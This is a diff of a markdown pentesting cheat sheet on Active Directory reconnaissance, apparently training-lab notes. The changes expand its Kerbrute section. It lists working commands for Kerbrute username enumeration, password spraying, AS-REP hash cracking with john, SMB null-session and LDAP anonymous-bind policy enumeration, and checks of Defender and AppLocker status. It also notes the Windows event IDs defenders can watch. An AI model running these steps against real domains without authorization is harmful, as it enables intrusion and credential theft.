@@ -2,16 +2,19 @@
 
 ---
 ### Content
+
 1. [Identifying Live Hosts](#identifying-live-hosts)
 2. [Internal AD Username Enumeration](#internal-ad-username-enumeration)
 3. [Enumerating & Retrieving Password Policies](#enumerating-&-retrieving-password-policies)
 	1. [From Linux](#from-linux)
 	2. [From Windows](#from-windows)
 4. [Enumerating Security Controls](#enumerating-security-controls)
+
 ---
 ## Identifying Live Hosts
 
 If we have a compromised host inside the domain, we can run `wireshark` or `tcpdump` to listen to the network
+
 ``` bash
 $ sudo -E wireshark
 $ sudo tcpdump -i <network_interface>
@@ -59,42 +62,54 @@ $ ./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
 ```
 
 #### Kerbrute
-- [Kerbrute](https://github.com/ropnop/kerbrute) can be a stealthier option for domain account enumeration.
-- Kerbrute sends a request for TGT ticket to the KDC without Kerberos Pre-Authentication to perform username enumeration.
-	- If the KDC responded with the error PRINCIPAL UNKNOWN, the username is invalid.
-	- If the KDC prompts for Kerberos Pre-Authentication, this signals that the username exists.
-	- If the KDC responded with an AS-REP message, this signals that the user is vulnerable to AS-REP Roasting. 
-- Using `jsmith.txt` or `jsmith2.txt` user lists from [Insidetrust](https://github.com/insidetrust/statistically-likely-usernames).
+
+[Kerbrute](https://github.com/ropnop/kerbrute) can be used in domain enumeration, it can be used in usernames enumeration and password spray attack.
+
+##### Username Enumeration
+
+- Kerbrute sends a request for TGT ticket to the KDC without Kerberos Pre-Authentication.
+	- If the KDC:
+		- Responded with the error PRINCIPAL UNKNOWN -> the username is invalid.
+		- Prompts for Kerberos Pre-Authentication -> the username exists.
+		- Responded with an AS-REP message -> the user is vulnerable to AS-REP Roasting. 
+
+> We can use `jsmith.txt` or `jsmith2.txt` user lists from [Insidetrust](https://github.com/insidetrust/statistically-likely-usernames) and there is also [linkedin2username](https://github.com/initstring/linkedin2username) tool to mash up possible usernames from a company's LinkedIn page..
 
 ``` bash
 $ sudo git clone https://github.com/ropnop/kerbrute.git
-$ make help
 $ make all
-$ ./kerbrute_linux_amd64 userenum -d inlanefreight.local --dc 172.16.5.5 jsmith.txt > valid_ad_users
+$ ./kerbrute_linux_amd64 userenum jsmith.txt --dc <IP/FQDN> -d <DOMAIN> > valid_ad_users
 # To clean the output for further use:
 $ awk '/VALID USERNAME:/ {split($NF,a,"@"); print a[1]}' valid_ad_users > clean
 ```
 
-If a user has no pre auth required and Kerbrute extracted his krb5asrep, we can brute force his plain text password
+If a user has no pre auth required, Kerbrute will pursue ASREPRoasting attack automatically by extracting a TGT hash that is ready to crack.
+
 ``` Bash
-# Add the hash to a file
+# Capture the hash from the tool output and add it to a file
 $ cat > krb5asrep_file
 # Crack it with john
 $ john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep krb5asrep_file
 ```
 
-
 Using Kerbrute for username enumeration will generate event ID [4768: A Kerberos authentication ticket (TGT) was requested](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4768). This will only be triggered if [Kerberos event logging](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/enable-kerberos-event-logging) is enabled via Group Policy. Defenders can tune their SIEM tools to look for an influx of this event ID, which may indicate an attack.
 
-There is also [linkedin2username](https://github.com/initstring/linkedin2username) to mash up possible usernames from a company's LinkedIn page.
+##### Password Spray
+
+This will generate both event IDs `4768` - `A Kerberos authentication ticket (TGT) was requested`, and `4771` - `Kerberos pre-authentication failed`.
+
+```bash
+$ ./kerbrute_linux_amd64 passwordspray users.txt <PASSWORD> --dc <IP/FQDN> -d <DOMAIN>
+```
 
 ---
 ## Enumerating & Retrieving Password Policies
 
-
 > If you are on an internal machine but don’t have valid domain credentials, you can look for SMB NULL sessions or LDAP anonymous binds on Domain Controllers.
 > If we have an SMB NULL session, LDAP anonymous bind, or a set of valid credentials, we can enumerate the password policy.
+
 #### From Linux
+
 ``` bash
 # Enumerating the Password Policy - Credentialed
 $ crackmapexec smb <ip> -u username -p Password --pass-pol
@@ -117,6 +132,7 @@ $ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -
 ```
 
 #### From Windows
+
 ``` powershell
 # Enumerating SMB Null Session
 # Establish a null session from a windows machine and confirm if we can perform more of this type of attack.
@@ -138,12 +154,14 @@ PS C:\> Get-DomainPolicy
 ## Enumerating Security Controls
 
 Checking the Status of Defender with Get-MpComputerStatus
+
 ``` Powershell
 # Check if RealTimeProtectionEnabled parameter is set to True, which means Defender is enabled on the system.
 PS C:\> Get-MpComputerStatus
 ```
 
 Using Get-AppLockerPolicy cmdlet we can see which applications or directories are whitelisted and blacklisted for users to use.
+
 ``` Powershell
 PS C:\> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 
@@ -159,6 +177,7 @@ Action              : Deny
 ```
 
 PowerShell [Constrained Language Mode](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) locks down many of the features needed to use PowerShell effectively, such as blocking COM objects, only allowing approved .NET types, XAML-based workflows, PowerShell classes, and more.
+
 ``` Powershell
 PS C:\> $ExecutionContext.SessionState.LanguageMode
 
